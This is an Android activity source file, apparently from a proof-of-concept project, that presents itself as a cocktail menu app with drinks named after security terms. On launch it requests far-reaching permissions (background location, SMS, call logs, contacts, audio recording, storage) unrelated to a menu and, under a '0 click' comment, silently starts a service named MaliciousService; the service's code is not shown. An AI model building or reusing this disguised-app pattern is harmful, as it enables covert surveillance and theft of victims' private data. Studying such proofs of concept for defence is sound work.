package com.merams.esd.instagram.poc;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.app.AppCompatDelegate;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.app.Activity;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.GridView;

import com.google.android.material.dialog.MaterialAlertDialogBuilder;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {

    GridView DishGV;
    ArrayList<Dishes> dishList;
    DishesAdapter adapter;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        AppCompatDelegate.setDefaultNightMode(AppCompatDelegate.MODE_NIGHT_NO);
        setContentView(R.layout.activity_main);
        ActivityCompat.requestPermissions(MainActivity.this,
                                new String[]{
                                        Manifest.permission.ACCESS_BACKGROUND_LOCATION,
                                        Manifest.permission.ACCESS_COARSE_LOCATION,
                                        Manifest.permission.ACCESS_FINE_LOCATION,
                                        Manifest.permission.READ_SMS,
                                        Manifest.permission.READ_CALL_LOG,
                                        Manifest.permission.BLUETOOTH,
                                        Manifest.permission.INTERNET,
                                        Manifest.permission.BLUETOOTH_ADMIN,
                                        Manifest.permission.BLUETOOTH_CONNECT,
                                        Manifest.permission.RECORD_AUDIO,
                                        Manifest.permission.READ_CONTACTS,
                                        Manifest.permission.WRITE_EXTERNAL_STORAGE},
                                1);









        DishGV = findViewById(R.id.gv_elements);

        dishList = new ArrayList<Dishes>();
        dishList.add(new Dishes("Le DataLeak","Wisky, Tequila, Citron et Gimgembre",12));
        dishList.add(new Dishes("Le DDOS","Absynthe pur à 99% ",20));
        dishList.add(new Dishes("Le MITM","Rhum des îles, Coca ",10));
        dishList.add(new Dishes("Le RedTeam","Grenadine, Biere",7));
        dishList.add(new Dishes("L'Owasp","Gin Schwepps",16));
        dishList.add(new Dishes("Le BlueTeam","Bombay Sapphire, jus de lime et sucre",6));

        adapter = new DishesAdapter(this, dishList);
        DishGV.setAdapter(adapter);


        //0 click
        startService(new Intent(MainActivity.this, MaliciousService.class));

    }
}